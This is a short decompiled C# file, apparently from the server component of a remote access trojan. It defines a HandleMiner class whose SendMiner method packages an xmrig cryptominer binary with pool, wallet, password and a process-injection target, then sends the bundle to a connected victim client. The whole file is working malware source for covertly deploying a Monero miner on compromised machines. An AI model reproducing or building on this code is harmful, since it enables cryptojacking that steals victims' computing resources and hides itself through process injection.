using System;
using System.IO;
using System.Threading;
using Server.Algorithm;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200006B RID: 107
	public class HandleMiner
	{
		// Token: 0x060002FB RID: 763 RVA: 0x0002050C File Offset: 0x0001E70C
		public void SendMiner(Clients client)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "xmr";
			msgPack.ForcePathObject("Command").AsString = "save";
			msgPack.ForcePathObject("Bin").SetAsBytes(Zip.Compress(File.ReadAllBytes("Plugins\\xmrig.bin")));
			msgPack.ForcePathObject("Hash").AsString = GetHash.GetChecksum("Plugins\\xmrig.bin");
			msgPack.ForcePathObject("Pool").AsString = XmrSettings.Pool;
			msgPack.ForcePathObject("Wallet").AsString = XmrSettings.Wallet;
			msgPack.ForcePathObject("Pass").AsString = XmrSettings.Pass;
			msgPack.ForcePathObject("InjectTo").AsString = XmrSettings.InjectTo;
			ThreadPool.QueueUserWorkItem(new WaitCallback(client.Send), msgPack.Encode2Bytes());
		}
	}
}
